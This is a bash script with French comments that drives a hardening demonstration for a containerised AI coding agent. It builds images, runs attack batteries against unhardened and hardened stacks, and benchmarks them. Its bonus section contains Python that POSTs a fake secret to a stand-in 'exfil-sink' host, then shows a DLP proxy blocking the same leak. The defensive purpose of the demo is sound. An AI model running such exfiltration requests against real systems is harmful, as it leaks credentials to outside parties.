#!/usr/bin/env bash
# =====================================================================
#  run.sh — orchestrateur de la demonstration de durcissement ZeroClaw.
#
#  Sous-commandes :
#     build            construit l'image durcie
#     pull             demarre ollama (durci) et telecharge le modele
#     seed             (re)genere un depot propre dans ./workspace/repo
#     up | down        demarre / arrete (et nettoie) les stacks
#     agent-task       execute une VRAIE tache zeroclaw (preuve de fonctionnement)
#     attack-naked     monte l'agent NU puis lance la batterie d'attaques
#     attack-hardened  monte l'agent DURCI puis lance la batterie d'attaques
#     bench            mesure image / RAM / demarrage / nb de syscalls
#     bonus            demo exfiltration via canal autorise + proxy DLP
#     demo             enchaine tout (build -> pull -> seed -> avant/apres -> bench)
#
#  Prerequis : Docker + plugin compose v2. Linux conseille (seccomp / cap-drop).
# =====================================================================
set -uo pipefail
cd "$(dirname "$0")"

HARDENED="docker-compose.yml"
NAKED="docker-compose.naked.yml"
MODEL="qwen2.5-coder:7b"
IMAGE="zeroclaw-hardened:latest"

log()  { printf '\n\033[1;36m== %s ==\033[0m\n' "$*"; }
warn() { printf '\033[33m[!] %s\033[0m\n' "$*"; }

build() {
  log "Construction de l image durcie"
  docker compose -f "$HARDENED" build
}

seed() {
  log "Generation d un depot propre dans ./workspace/repo"
  rm -rf workspace/repo
  mkdir -p workspace/repo
  cat > workspace/repo/main.py << 'SEED_PY_EOF'
def add(a, b):
    return a + b


if __name__ == "__main__":
    print(add(2, 3))
SEED_PY_EOF
  cat > workspace/repo/README.md << 'SEED_MD_EOF'
# demo-repo
Petit depot d'exemple que l'agent doit resumer.
SEED_MD_EOF
  printf 'OK — workspace/repo regenere.\n'
}

pull() {
  log "Demarrage d ollama + telechargement du modele ($MODEL)"
  docker compose -f "$HARDENED" up -d ollama
  # ollama est sur pull_net => Internet uniquement pour recuperer le modele.
  docker compose -f "$HARDENED" exec -T ollama ollama pull "$MODEL"
  printf 'Modele %s pret (cache dans le volume ollama_models).\n' "$MODEL"
}

up()   { log "Demarrage de la stack durcie"; docker compose -f "$HARDENED" up -d; }

down() {
  log "Arret + nettoyage de toutes les stacks"
  docker compose -f "$HARDENED" --profile bonus down -v 2>/dev/null || true
  docker compose -f "$NAKED" down -v 2>/dev/null || true
}

agent_task() {
  log "Tache RÉELLE de l agent (preuve que le binaire tourne durci)"
  warn "necessite que 'pull' ait ete execute au moins une fois."
  docker compose -f "$HARDENED" up -d
  docker compose -f "$HARDENED" exec -T agent \
    zeroclaw agent -a coding -m "Resume le depot situe dans ./workspace/repo" \
    || warn "Ajustez la commande a la CLI reelle (zeroclaw --help)."
}

attack_naked() {
  log "AVANT — agent NU"
  docker compose -f "$NAKED" up -d
  ./attack/run_attacks.sh "$NAKED" "AGENT NU"
}

attack_hardened() {
  log "APRÈS — agent DURCI"
  docker compose -f "$HARDENED" up -d
  ./attack/run_attacks.sh "$HARDENED" "AGENT DURCI"
}

bench() {
  log "Benchmark"
  printf 'Image durcie — taille :\n'
  docker image ls "$IMAGE" --format '  {{.Repository}}:{{.Tag}}  {{.Size}}'
  printf '\nSyscalls autorises par le profil seccomp : '
  python3 -c "import json;print(len(json.load(open('seccomp.json'))['syscalls'][0]['names']))"
  printf '\n'
  docker compose -f "$HARDENED" up -d agent >/dev/null 2>&1 || true
  local t0 t1
  t0=$(date +%s.%N); docker compose -f "$HARDENED" exec -T agent sh -c 'true'; t1=$(date +%s.%N)
  printf 'Aller-retour exec conteneur : %ss\n' "$(echo "$t1 - $t0" | bc 2>/dev/null || echo '?')"
  printf 'RAM / CPU residents de l agent :\n'
  docker stats --no-stream --format '  mem={{.MemUsage}}  cpu={{.CPUPerc}}' zc-agent 2>/dev/null || true
}

bonus() {
  log "BONUS — exfiltration par canal autorise, puis correctif proxy DLP"
  docker compose -f "$HARDENED" --profile bonus up -d
  sleep 2
  docker compose -f "$HARDENED" exec -T egress-proxy python3 - << 'PY'
import urllib.request, urllib.error

def post(url, data):
    req = urllib.request.Request(url, data=data.encode(), method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status, r.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

SECRET = "secret=FAKE_SECRET_DEADBEEF12345"
BENIGN = "msg=build-ok"

print("[1] VULN  — POST direct du secret vers le canal autorise (exfil-sink:9000)")
s, _ = post("http://exfil-sink:9000/leak", SECRET)
print(f"        -> HTTP {s} : la fuite PASSE (filtrer par destination ne suffit pas)")

print("[2] FIX   — meme secret route via le proxy DLP (egress-proxy:8080)")
s, b = post("http://localhost:8080/leak", SECRET)
print(f"        -> HTTP {s} : {b} (signature de secret detectee => BLOQUÉ)")

print("[3] FIX   — trafic legitime SANS secret via le proxy DLP")
s, _ = post("http://localhost:8080/ok", BENIGN)
print(f"        -> HTTP {s} : transite normalement vers l'amont")
PY
  printf '\nJournal du collecteur (preuve de ce qui est reellement sorti) :\n'
  docker compose -f "$HARDENED" exec -T exfil-sink sh -c 'cat /data/received.log 2>/dev/null || echo "(vide)"'
}

demo() {
  build; seed; pull
  attack_naked
  attack_hardened
  bench
  log "Demo terminee. Bonus separe : ./run.sh bonus"
}

cmd="${1:-help}"
case "$cmd" in
  build)            build ;;
  seed)             seed ;;
  pull)             pull ;;
  up)               up ;;
  down)             down ;;
  agent-task)       agent_task ;;
  attack-naked)     attack_naked ;;
  attack-hardened)  attack_hardened ;;
  bench)            bench ;;
  bonus)            bonus ;;
  demo)             demo ;;
  *) sed -n '4,21p' "$0" | sed 's/^#\{0,1\} \{0,1\}//' ;;
esac
